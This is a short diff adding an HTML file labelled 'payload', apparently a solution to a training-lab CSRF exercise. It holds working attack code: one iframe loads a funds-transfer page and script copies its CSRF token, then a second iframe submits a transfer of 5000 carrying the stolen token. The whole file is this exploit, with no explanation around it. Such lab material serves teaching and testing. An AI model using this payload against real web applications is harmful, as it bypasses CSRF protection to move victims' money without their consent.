@@ -1,0 +1,22 @@
+<!-- payload -->
+<iframe src="attack?Screen=803158781&menu=900&transferFunds=main" onload="first();" id="first"></iframe>
+<iframe id="second"></iframe>
+
+<script type="text/javascript">
+    var token;
+
+    function first() {
+        var frame = document.getElementById("first").contentDocument;
+        var form = frame.getElementsByTagName("form")[0];
+        token = '&CSRFToken=' + form.CSRFToken.value;
+
+        console.log(token);
+
+        second();
+    }
+
+    function second() {
+        var frame = document.getElementById("second");
+        frame.src = "attack?Screen=803158781&menu=900&transferFunds=5000" + token;
+    }
+</script>
